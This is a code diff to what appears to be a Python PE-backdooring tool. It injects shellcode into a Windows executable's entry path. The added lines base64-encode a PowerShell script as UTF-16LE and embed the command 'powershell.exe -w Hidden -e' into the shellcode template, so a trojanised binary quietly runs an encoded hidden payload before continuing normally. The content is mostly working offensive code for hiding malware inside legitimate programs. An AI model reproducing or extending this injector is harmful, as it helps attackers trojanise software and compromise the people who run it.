@@ -4,6 +4,7 @@ import pefile
 import sys
 from os import system
 import struct
+import base64
 
 def align(size, alignment):
     return (((size + alignment - 1) // alignment) * alignment)
@@ -82,7 +83,13 @@ def craftShellcode(filePath, scriptPath):
 
     print("[*] Reading powershell script")
     with open(scriptPath, "r") as f:
-        script = f.read().strip('\n')
+        script = f.read().strip('\n').replace("\\", "\\\\")
+        #use UTF-16LE instead of UTF-16 to drop the BOM at the beginning
+        print("[*] Encoding powershell script")
+        script = script.encode("UTF-16LE")
+        b64Script = base64.b64encode(script).decode("utf-8")
+
+    powershellCmdLine = "powershell.exe -w Hidden -e %s"%(b64Script)
 
     #Read shellcode template from file
     with open("template.S", "r") as f:
@@ -91,7 +98,7 @@ def craftShellcode(filePath, scriptPath):
     #compile the shellcode to a COFF file then extract it
     print("[*] Compiling shellcode")
     asmFile = open("shellFile.S", "w")
-    asmFile.write(asmTemplate %("powershell.exe", originalEntryPoint))
+    asmFile.write(asmTemplate %(powershellCmdLine, originalEntryPoint))
     asmFile.close()
     system("nasm -f win64 shellFile.S -o compiled.obj")
     compiledCode = extractShellcode("compiled.obj")
